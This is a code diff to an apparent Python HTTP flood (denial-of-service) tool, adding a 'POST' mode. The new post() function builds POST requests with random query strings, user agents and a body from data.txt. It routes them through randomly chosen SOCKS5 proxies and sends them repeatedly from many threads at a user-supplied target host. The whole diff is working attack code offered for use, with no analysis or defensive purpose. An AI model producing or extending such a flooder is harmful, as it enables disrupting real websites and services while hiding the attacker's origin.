@@ -198,6 +198,8 @@ def main():
         print("GET Mode Selected")
     elif mode == "head" or mode == "HEAD":
         print("HEAD Mode Selected")
+    elif mode == "post" or mode == "POST":
+        print("POST Mode Selected")
     ip = str(input("Address/Host:"))
     prevent()
     if ip == "":
@@ -265,6 +267,35 @@ def get():
             if port == 443:
                 ctx = ssl.SSLContext()
                 s = ctx.wrap_socket(s,server_hostname=str(ip))
+            s.connect((str(ip), int(port)))
+            for _ in range(multiple):
+                s.send(str.encode(request))
+            s.close()
+        except:
+            pass
+def post():
+    rand_url = random.choice(strings)
+    post_host = "POST " + page +"?"+ rand_url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+    connection = "Connection: Keep-Alive\r\n"
+    accept = random.choice(acceptall)
+    ua = random.choice(useragents)
+
+    # Read data from text file
+    with open("data.txt", "r") as file:
+        data = file.read()
+
+    # Update request method and include necessary headers
+    request = post_host + ua + accept + connection + "Content-Type: application/x-www-form-urlencoded\r\n" \
+              "Content-Length: {}\r\n\r\n".format(len(data)) + data
+
+    proxy = random.choice(proxies).strip().split(":")
+    for __ in range(50):
+        try:
+            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+            s = socks.socksocket()
+            if port == 443:
+                ctx = ssl.SSLContext()
+                s = ctx.wrap_socket(s, server_hostname=str(ip))
             s.connect((str(ip), int(port)))
             for _ in range(multiple):
                 s.send(str.encode(request))
@@ -350,6 +381,10 @@ if __name__ == "__main__":
 if mode == "get" or mode == "GET":
     for i in range(th_num):
             th = threading.Thread(target=get,daemon=True)
+            th.start()
+elif mode == "post" or mode == "POST":
+    for i in range(th_num):
+            th = threading.Thread(target=post,daemon=True)
             th.start()
 elif mode == "head" or mode == "HEAD":
     for i in range(th_num):
